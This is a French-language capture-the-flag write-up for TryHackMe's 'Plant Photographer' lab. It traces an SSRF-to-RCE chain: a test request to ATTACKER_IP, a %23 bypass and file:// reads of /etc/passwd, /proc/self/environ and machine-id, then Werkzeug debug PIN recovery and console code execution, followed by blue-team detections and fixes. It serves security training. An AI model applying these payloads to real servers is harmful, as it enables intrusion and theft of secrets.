# 🌱 TryHackMe – Plant Photographer Write-up

## 📘 Write-up enrichi – Plant Photographer (TryHackMe)

```markdown
---

# 🧠 Objectif pédagogique

Ce lab illustre une **chaîne d’exploitation complète réaliste** :

> **SSRF → contournement → LFI → fuite de code → bypass logique → RCE**

Chaque étape repose sur une hypothèse testée, validée, puis exploitée.

---

# 🔎 1. Reconnaissance applicative

## Observation

L’application propose un téléchargement d’images.

Requête interceptée :

```http
/download?server=...&id=...
```

## Analyse

* `server` est contrôlé par l’utilisateur
* utilisé côté backend pour construire une requête

## Hypothèse

➡️ **SSRF possible**

---

# 🌐 2. Validation SSRF

## Test 1 – Interaction externe

```bash
http://target/download?server=http://ATTACKER_IP
```

### Résultat attendu

* réception d’une requête côté attaquant (Burp Collaborator / nc / serveur web)

✔️ Conclusion : **SSRF confirmé**

---

## Test 2 – Accès interne

```bash
http://target/download?server=http://127.0.0.1
```

### Objectif

* accéder à des services internes non exposés

✔️ Conclusion : **pivot interne possible**

---

# ⚠️ 3. Analyse du filtrage

## Comportement backend

```python
url = server + "/public-docs/" + filename
```

### Problème

* impossible d’accéder directement à des fichiers arbitraires

---

## 🧪 Test de contournement

### Idée

Utiliser le fragment URL `#` (ignoré côté serveur HTTP)

### Payload

```bash
server=file:///etc/passwd%23
```

### Explication

* `%23` = `#`
* tout ce qui suit est ignoré
* permet de casser la concaténation

✔️ Résultat : accès direct au fichier

---

# 📂 4. Transformation SSRF → LFI

## Test clé

```bash
file:///etc/passwd
```

### Résultat

* contenu du fichier affiché

✔️ Conclusion :
➡️ SSRF + `file://` = **Local File Inclusion**

---

# 🔍 5. Phase d’énumération

## Objectif

Collecter un maximum d’informations système

### Tests réalisés

```bash
file:///etc/passwd
file:///proc/self/cgroup
file:///proc/self/environ
file:///usr/src/app/app.py
```

---

## 🎯 Point critique : récupération du code source

### Pourquoi ?

* comprendre la logique métier
* identifier des failles logiques

---

# 🔑 6. Analyse du code

## Découverte 1 – Contrôle d’accès

```python
if request.remote_addr == '127.0.0.1':
```

### Interprétation

* accès admin basé uniquement sur IP

⚠️ Faible sécurité

---

# 🔓 7. Bypass d’authentification

## Test

```bash
server=http://127.0.0.1/admin
```

### Pourquoi ça fonctionne ?

* la requête est faite par le serveur lui-même
* `remote_addr = 127.0.0.1`

✔️ Résultat : accès admin

---

# 🐞 8. Identification du mode debug

## Observation

* erreurs Flask affichent des traces détaillées

➡️ présence du **debug mode activé**

---

## Risque critique

Expose la console :

```text
/console
```

---

# 🧮 9. Génération du PIN Werkzeug

## Problème

Console protégée par un PIN

---

## 🧠 Démarche

### Étape 1 – Identifier les variables nécessaires

Werkzeug utilise :

* username
* chemin app
* MAC address
* machine-id

---

### Étape 2 – Collecte via LFI

```bash
file:///etc/machine-id
file:///sys/class/net/eth0/address
file:///proc/self/environ
```

---

### Étape 3 – Reproduction de l’algo

* hash des valeurs
* génération du PIN

✔️ Résultat : PIN valide

---

# 💻 10. Exploitation RCE

## Accès console

```
http://target/console
```

Entrer le PIN

---

## Test

```python
import os
os.listdir('/')
```

✔️ Code exécuté

---

## Lecture du flag

```python
open('/usr/src/app/flag.txt').read()
```

---

# 🏁 Flag

```
THM{...}
```

---

# 🧪 Méthodologie 

## Cycle utilisé

1. Observation
2. Hypothèse
3. Test simple
4. Validation
5. Pivot
6. Exploitation avancée

---

## Exemple concret

| Étape  | Hypothèse       | Test            | Résultat |
| ------ | --------------- | --------------- | -------- |
| SSRF   | URL contrôlée   | serveur externe | ✔️       |
| Pivot  | accès interne   | 127.0.0.1       | ✔️       |
| Bypass | concat cassable | `%23`           | ✔️       |
| LFI    | file://         | /etc/passwd     | ✔️       |
| Code   | fuite possible  | app.py          | ✔️       |
| Auth   | IP faible       | SSRF admin      | ✔️       |
| Debug  | actif           | /console        | ✔️       |
| PIN    | reproductible   | LFI             | ✔️       |
| RCE    | console         | Python          | ✔️       |

---

# 🛡️ Vision Blue Team

## Détections possibles

* requêtes sortantes inhabituelles
* accès `file://`
* accès localhost via backend
* erreurs Flask exposées

---

## Mesures correctives

### Application

* désactiver debug Flask
* valider strictement les URL
* blacklist `file://`, `gopher://`, etc.

### Infra

* segmentation réseau
* proxy sortant filtrant

---

# 📚 Ressources (avec liens directs)

## Write-ups

* [Plant Photographer – Sle3pyHead](https://medium.com/@Sle3pyHead/plant-photographer-ctf-notes-tryhackme-14ed5b5f4a69?utm_source=chatgpt.com)
* [Walkthrough – m0ro23 (SSRF → RCE Werkzeug)](https://medium.com/@m0ro23/plant-photographer-tryhackme-walkthrough-2026-ssrf-to-rce-via-werkzeug-console-a546bfb93ad2?utm_source=chatgpt.com)
* [Walkthrough – TremendousNod (bypass %23)](https://medium.com/@tremendousnod/tryhackme-plant-photographer-walkthrough-e225b99bd095?utm_source=chatgpt.com)
* [Walkthrough – Hadamanash (PIN Werkzeug)](https://medium.com/@hadamanash2023/tryhackme-plant-photographer-walkthrough-0bb9e38c45d1?utm_source=chatgpt.com)

---

### Concepts

* Werkzeug Debugger
* Server-Side Request Forgery
* Local File Inclusion

---
